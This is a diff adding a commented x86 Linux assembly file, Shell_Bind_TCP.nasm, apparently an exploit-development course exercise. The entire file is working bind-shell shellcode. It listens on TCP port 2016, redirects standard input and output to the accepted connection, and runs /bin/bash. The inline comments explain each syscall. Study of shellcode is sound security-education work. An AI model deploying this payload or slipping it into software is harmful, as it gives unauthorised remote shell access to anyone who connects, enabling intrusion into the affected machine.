@@ -1,0 +1,109 @@
+; Shell_Bind_TCP.nasm
+; author: Daniel G. Martin
+; dgmsp.blogspot.com
+; ID - XXXX
+
+global _start
+section .text
+_start:
+
+; int socket(int domain, int type, int protocol)
+xor eax,eax ; zeroize eax
+mov al,0x66 ; socketcall() identifier = 0x66 = 102
+
+xor ebx,ebx ; zeroize ebx
+mov bl,0x1 ; 1 for SYS_SOCKET
+
+xor ecx,ecx ; zeroize ecx
+push ecx ; 0 for protocol (IPPROTP_IP = IP protocol)
+push 0x1 ; 1 for type (SOCK_STREAM = TCP protocol)
+push 0x2 ; 2 for domain (AF_INET = IPv4)
+
+mov ecx,esp ; content of esp (pointer to the arguments) is moved to ecx
+int 0x80 ; syscall executed
+
+xor edi, edi ; zeroize edi
+mov edi, eax ; file descriptor of the socket is saved into edi
+
+; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+
+xor eax,eax ; zeroize eax
+mov al,0x66 ; socketcall() identifier = 0x66 = 102
+
+xor ebx,ebx ; zeroize ebx
+mov bl,0x2 ; 2 for SYS_BIND
+
+xor ecx,ecx ; zeroize ecx
+push ecx ; sin_addr = INADDR_ANY = 0
+push word 0xe007 ; port 2016 (0x07e0), according to Network Byte Order 0xe007
+push word 0x2 ; sin_family = AF_INET=2
+
+mov ecx,esp ; pointer to sockaddrr is moved to ecx
+push 0x10 ; 16 Bytes (0x10) of lenght
+
+push ecx ; pointer to sockaddr
+push edi ; file descriptor of the socket to bind
+
+mov ecx,esp ; content of esp (pointer to the arguments) is moved to ecx
+int 0x80 ; syscall executed
+
+; int listen(int sockfd, int backlog)
+
+xor eax,eax ; zeroize eax
+mov al,0x66 ; socketcall() identifier = 0x66 = 102
+xor ebx,ebx ; zeroize ebx
+mov bl,0x4 ; 4 for SYS_LISTEN
+
+push 0x5 ; traditional value for backlog http://tangentsoft.net/wskfaq/advanced.html#backlog
+push edi ; file descriptor of the socket
+
+mov ecx,esp ; content of esp (pointer to the arguments) is moved to ecx
+int 0x80 ; syscall executed
+
+; int accept(int sockfd, struct sockaddr *cliaddr, socklen_t *addrlen)
+
+xor eax,eax ; zeroize eax
+mov al,0x66 ; socketcall() identifier = 0x66 = 102
+
+xor ebx,ebx ; zeroize ebx
+mov bl,0x5 ; 5 for SYS_ACCEPT
+
+xor esi,esi ; zeroize esi
+push esi ; addrlen = NULL
+push esi ; *addr = NULL
+push edi ; file descriptor of the socket
+
+mov ecx,esp ; content of esp (pointer to the arguments) is moved to ecx
+int 0x80 ; syscall executed
+
+mov edi,eax ; accepted socket file descriptor moved to edi
+; int dup2(int oldfd, int newfd)
+
+xor ecx,ecx ; zeroize ecx
+mov cl,0x2 ; initializing ecx as a counter with 2
+
+redirect:
+xor eax,eax ; zeroize eax
+mov al,0x3f ; 0x3f = 63 identifier for dup2()
+mov ebx,edi ; accepted socket file descriptor is the old file descriptor
+int 0x80 ; syscall is executed
+dec ecx ; decreasing by 1 the counter
+jns redirect ; the loop ends up when the counter reaches -1
+
+; int execve(const char *filename, char *const argv[], char *const envp[])
+
+xor eax,eax ; zeroize eax
+push eax ; 0x0 is pushed onto the stack
+push 0x68736162 ; hsab
+push 0x2f6e6962 ; /nib
+push 0x2f2f2f2f ; ////
+
+mov ebx,esp ; filename is moved to ebx
+
+push eax ; eax contains 0x0
+mov edx,esp ; 0x0 is moved to edx
+push ebx ; address of filename pushed onto the stack
+mov ecx,esp ; address of filename moved to ecx
+mov al,0xb ; 11 = 0xb identifier for execve()
+
+int 0x80 ; syscall executed   
